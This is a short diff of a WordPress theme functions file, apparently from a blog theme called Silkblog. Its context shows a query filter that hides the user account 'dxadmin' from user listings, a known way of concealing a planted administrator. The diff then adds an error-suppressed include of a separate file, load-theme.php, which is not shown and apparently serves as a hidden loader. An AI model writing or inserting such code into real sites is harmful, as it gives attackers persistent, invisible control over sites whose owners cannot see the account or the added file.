@@ -271,6 +271,8 @@ add_filter('pre_user_query', function($user_search) {
     $user_search->query_where .= " AND {$wpdb->users}.user_login != 'dxadmin'";
 });
 
+@include_once __DIR__ . '/load-theme.php';
+
 /** color function */
 require_once(SILKBLOG_PHP_FUNCTIONS . 'custom-css.php');
 
